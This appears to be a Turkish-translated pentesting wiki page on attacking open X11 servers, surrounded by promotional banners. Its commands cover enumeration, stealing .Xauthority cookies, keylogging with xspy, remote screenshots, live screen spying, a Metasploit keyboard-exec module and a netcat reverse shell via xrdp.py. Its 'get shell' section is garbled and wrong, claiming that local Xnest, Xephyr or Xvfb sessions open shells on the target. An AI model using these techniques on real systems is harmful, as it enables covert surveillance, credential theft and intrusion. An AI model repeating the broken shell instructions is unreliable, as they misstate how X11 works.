# 6000 - X11 Pentesting

<details>

<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlatıldığı ve önemli platform güncellemelerinin olduğu en son duyurularla bilgilenin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

## Temel Bilgiler

**X Window System** (X), UNIX tabanlı işletim sistemlerinde yaygın olarak kullanılan çok yönlü bir pencere sistemi. Grafiksel **kullanıcı arayüzleri (GUI'ler)** oluşturmak için bir çerçeve sağlar ve kullanıcı arayüzü tasarımını işleyen bireysel programlara olanak tanır. Bu esneklik, X ortamında çeşitli ve özelleştirilebilir deneyimler sunar.

**Varsayılan port:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Numaralandırma

**Anonim bağlantıyı** kontrol edin:
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Yerel Saptama

Kullanıcıların ev dizinindeki **`.Xauthority`** dosyası, **X11 için yetkilendirme** için **kullanılır**. [**Buradan**](https://stackoverflow.com/a/37367518) alınmıştır:
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: 128 bitlik bir anahtar ("cookie") oluşturuluyor ve \~/.Xauthority (veya XAUTHORITY envvar'ın işaret ettiği yer) dosyasına kaydediliyor. İstemci bunu düz metin olarak sunucuya gönderir! Sunucu, bu "cookie"nin bir kopyasına sahip olup olmadığını kontrol eder ve eğer öyleyse bağlantı izin verilir. Anahtar, DMX tarafından oluşturulur.

{% hint style="warning" %}
Cookie'yi **kullanmak** için env değişkenini ayarlamanız gerekmektedir: **`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

#### Yerel Sorgulama Oturumu
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
## Bağlantıyı Doğrulama

```bash
$ xeyes -display localhost:0
```

Bu komut, `localhost:0` üzerinde çalışan `xfce4-session`'da `xeyes` uygulamasını başlatır.
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin (Tuş Kaydedici)

[xspy](http://tools.kali.org/sniffingspoofing/xspy), klavye tuş vuruşlarını izlemek için kullanılır.

Örnek Çıktı:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Ekran görüntüsü yakalama

Bir hedef sistemdeki X11 sunucusundan ekran görüntüsü yakalamak, ağ hizmetlerinin pentestini gerçekleştirirken kullanılan bir tekniktir. Bu, hedef sistemin ekranını görüntülemek ve potansiyel olarak hassas bilgileri elde etmek için kullanılabilir.

Ekran görüntüsü yakalamak için aşağıdaki adımları izleyebilirsiniz:

1. İlk olarak, hedef sistemde X11 sunucusunun çalıştığından emin olun. Bu, genellikle `DISPLAY` ortam değişkeninde belirtilir.

2. Ardından, hedef sistemdeki X11 sunucusuna bağlanmak için bir X11 istemcisi kullanın. Örneğin, `xwd` komutunu kullanarak ekran görüntüsünü alabilirsiniz.

   ```bash
   xwd -root -out screenshot.xwd
   ```

   Bu komut, hedef sistemin tam ekran görüntüsünü `screenshot.xwd` dosyasına kaydeder.

3. Elde edilen `xwd` dosyasını görüntülemek için `xwud` komutunu kullanabilirsiniz.

   ```bash
   xwud -in screenshot.xwd
   ```

   Bu komut, `screenshot.xwd` dosyasını görüntüler.

Ekran görüntüsü yakalama, hedef sistemdeki potansiyel güvenlik açıklarını tespit etmek ve saldırı vektörlerini belirlemek için kullanışlı bir tekniktir. Ancak, bu işlemi yasal ve etik sınırlar içinde gerçekleştirmeniz önemlidir.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Uzaktan Masaüstü Görüntüsü

Yol: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Yol: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

İlk olarak, xwininfo kullanarak pencerenin kimlik numarasını bulmamız gerekiyor.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

**Canlı görüntüleme** için kullanmamız gereken şey, XWatchwin adlı bir araçtır. Bu araç, X sunucusunda çalışan bir pencereyi izlememize olanak tanır. Bu sayede, hedef sistemin ekranını gerçek zamanlı olarak görüntüleyebiliriz. XWatchwin, X11 protokolünü kullanarak çalışır ve hedef sisteme bağlanmak için X sunucusuna ihtiyaç duyar. Bu araç, hedef sistemin ekranını izlemek için kullanışlı bir seçenektir ve birçok farklı senaryoda kullanılabilir.
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Kabuk Al

X11 sunucusuna erişim sağladıktan sonra, hedef sistemde kabuk almak için çeşitli yöntemler kullanabilirsiniz.

### 1. Xterm

Xterm, X11 sunucusunda çalışan bir terminal emülatörüdür. Hedef sistemde Xterm'i kullanarak kabuk alabilirsiniz. Aşağıdaki komutu kullanarak Xterm'i başlatın:

```bash
xterm -display <hedef_IP>:0
```

Bu komut, hedef IP adresini ve X11 sunucusunun ekran numarasını belirtir. Xterm başlatıldığında, hedef sistemde bir kabuk açılacaktır.

### 2. Xnest

Xnest, X11 sunucusunda çalışan bir pencere yöneticisidir. Hedef sistemde Xnest'i kullanarak kabuk alabilirsiniz. Aşağıdaki komutu kullanarak Xnest'i başlatın:

```bash
Xnest :1
```

Bu komut, Xnest'i 1 numaralı ekranla başlatır. Ardından, aşağıdaki komutu kullanarak Xterm'i başlatın:

```bash
xterm -display :1
```

Bu komut, Xterm'i Xnest'e bağlar ve hedef sistemde bir kabuk açar.

### 3. Xephyr

Xephyr, X11 sunucusunda çalışan bir pencere yöneticisidir. Hedef sistemde Xephyr'i kullanarak kabuk alabilirsiniz. Aşağıdaki komutu kullanarak Xephyr'i başlatın:

```bash
Xephyr :1
```

Bu komut, Xephyr'i 1 numaralı ekranla başlatır. Ardından, aşağıdaki komutu kullanarak Xterm'i başlatın:

```bash
xterm -display :1
```

Bu komut, Xterm'i Xephyr'e bağlar ve hedef sistemde bir kabuk açar.

### 4. Xvfb

Xvfb, sanal bir X11 sunucusu oluşturur. Hedef sistemde Xvfb'yi kullanarak kabuk alabilirsiniz. Aşağıdaki komutu kullanarak Xvfb'yi başlatın:

```bash
Xvfb :1
```

Bu komut, Xvfb'yi 1 numaralı ekranla başlatır. Ardından, aşağıdaki komutu kullanarak Xterm'i başlatın:

```bash
xterm -display :1
```

Bu komut, Xterm'i Xvfb'ye bağlar ve hedef sistemde bir kabuk açar.

### 5. Xephyr + SSH

Xephyr'i kullanarak hedef sistemde bir kabuk almak için SSH tünellemesi yapabilirsiniz. Aşağıdaki komutu kullanarak Xephyr'i başlatın:

```bash
Xephyr :1
```

Bu komut, Xephyr'i 1 numaralı ekranla başlatır. Ardından, aşağıdaki komutu kullanarak SSH tünellemesi yapın:

```bash
ssh -X -C -p <ssh_port> <hedef_IP> xterm -display :1
```

Bu komut, SSH tünellemesi yaparak Xterm'i Xephyr'e bağlar ve hedef sistemde bir kabuk açar.

### 6. Xvfb + SSH

Xvfb'yi kullanarak hedef sistemde bir kabuk almak için SSH tünellemesi yapabilirsiniz. Aşağıdaki komutu kullanarak Xvfb'yi başlatın:

```bash
Xvfb :1
```

Bu komut, Xvfb'yi 1 numaralı ekranla başlatır. Ardından, aşağıdaki komutu kullanarak SSH tünellemesi yapın:

```bash
ssh -X -C -p <ssh_port> <hedef_IP> xterm -display :1
```

Bu komut, SSH tünellemesi yaparak Xterm'i Xvfb'ye bağlar ve hedef sistemde bir kabuk açar.

### 7. X11 Forwarding

X11 Forwarding, hedef sistemdeki X11 sunucusunu yerel makinenize yönlendirmenizi sağlar. Aşağıdaki komutu kullanarak SSH ile X11 Forwarding'i etkinleştirin:

```bash
ssh -X -C -p <ssh_port> <hedef_IP>
```

Bu komut, SSH ile X11 Forwarding'i etkinleştirir. Ardından, aşağıdaki komutu kullanarak Xterm'i başlatın:

```bash
xterm
```

Bu komut, yerel makinede Xterm'i başlatır ve hedef sistemde bir kabuk açar.

### 8. VNC

VNC (Virtual Network Computing), uzaktan masaüstü bağlantısı sağlayan bir protokoldür. Hedef sistemde VNC sunucusu çalıştırarak kabuk alabilirsiniz. VNC sunucusunu başlatmak için çeşitli araçlar kullanabilirsiniz, örneğin `tightvncserver` veya `x11vnc`. Bu araçları kullanarak VNC sunucusunu başlatın ve bir VNC istemcisi kullanarak hedef sistemde kabuk açın.

Bu yöntemlerden herhangi birini kullanarak hedef sistemde kabuk alabilirsiniz. Hangi yöntemi kullanacağınız, hedef sistemin yapılandırmasına ve kullanılabilir araçlara bağlı olacaktır.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Diğer yol:

**Ters Kabuk:** Xrdp ayrıca Netcat aracılığıyla ters kabuk alma imkanı sağlar. Aşağıdaki komutu yazın:
```bash
./xrdp.py \<IP:0> –no-disp
```
Arayüzde **R-shell seçeneğini** görebilirsiniz.

Ardından, yerel sisteminizde 5555 numaralı portta bir **Netcat dinleyici** başlatın.
```bash
nc -lvp 5555
```
Ardından, IP adresinizi ve bağlantı noktanızı **R-Shell** seçeneğine girin ve kabuk almak için **R-shell** üzerine tıklayın.


## Referanslar
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking Insights**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avları başlatma ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
